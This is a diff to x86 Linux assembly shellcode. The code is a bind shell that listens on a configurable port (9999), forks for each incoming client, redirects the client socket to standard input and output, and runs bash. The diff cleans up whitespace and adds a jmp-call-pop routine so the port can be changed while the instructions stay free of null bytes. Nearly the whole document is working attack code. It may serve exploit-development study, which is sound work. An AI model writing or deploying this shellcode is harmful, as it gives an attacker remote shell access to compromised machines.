@@ -3,11 +3,11 @@
 ; Website:  http://markshaneck.com
 ;
 ;
-; Purpose: The purpose of this shellcode is to serve shells 
+; Purpose: The purpose of this shellcode is to serve shells
 ; to multiple clients without exiting
 
 
-global _start			
+global _start
 
 section .text
 _start:
@@ -29,7 +29,7 @@ _start:
 
 	; eax now contains the socket file descriptor
 	; save it in esi for later usage
-	mov esi,eax	
+	mov esi,eax
 
 	; Bind to the socket
         ; need to contruct the sockaddr_in
@@ -38,8 +38,20 @@ _start:
 	push ebx ; null padding
 	push ebx ; null padding
 	push ebx ; INADDR_ANY
-	mov ebx, 0x2f27f0f2
-	and ebx, 0x0fff0f0f ;get 0x0200270f into ebx without any null bytes in the instructions
+
+ 	; perform a jmp-call-pop to get the port number so that it is easily configurable
+	jmp short get_port
+
+got_port:
+	xor edx,edx
+	pop ecx ; put address of port number into ecx
+	mov ecx,[ecx] ; put port number into ecx
+	mov dx, cx
+	shl edx,16
+	mov ebx, 0xf00f0ff2
+	and ebx, 0x0ff0f00f
+	add ebx,edx ;get 0x0200270f into ebx without any null bytes in the instructions
+
 	push ebx
 	mov ebx, esp ; now ebx has the address of the sockaddr_in struct
         xor ecx,ecx
@@ -63,7 +75,7 @@ _start:
 	mov bl, 4 ; listen sockcall type
 	mov al, 102 ; syscall - socketcall
 	int 0x80
-	
+
 handle_connections:
 	; accept a connection
 	xor eax,eax
@@ -95,18 +107,22 @@ handle_connections:
 	xor ebx,ebx ; get a 0 to compare against
 	cmp eax,ebx ; compare with zero
 	je child ; if fork return a zero, we are in the child process
-	
+
 	; call waitpid to prevent zombies
 	xor edx,edx ; options
 	sub esp,4 ; allocate space for return status
 	mov ecx,esp
 	mov ebx,eax ; child pid
-	xor eax,eax 
+	xor eax,eax
 	mov al, 7 ; waitpid syscall
 	add esp,4 ; restore stack from child exit status
 
 	; infinite loop
 	jmp handle_connections
+
+; need an intermediate target, since my code is too long for a short jump
+get_port:
+	jmp get_port_2
 
 child:
 	; duplicate the file descriptors
@@ -121,7 +137,7 @@ child:
 	mov al, 63
 	inc ecx
 	int 0x80 ; dup2(clientsock, 2)
-	
+
 	; execve the shell using stack method
  	; let's execute bash
 	xor eax,eax
@@ -133,11 +149,14 @@ child:
 	mov ebx,esp ; pointer to "////bin/bash"
 	push eax
 	mov edx,esp ; env pointer (NULL)
-	
+
 	push ebx
 	mov ecx,esp ; pointer to [pointer to "////bin/bash", 0]
 
 	mov al, 11 ; execve syscall
 	int 0x80
-	
-	
+
+get_port_2:
+	call got_port
+	port: db 0x27, 0x0f ; port 9999
+	; easy to configure the port number, just change the last two bytes
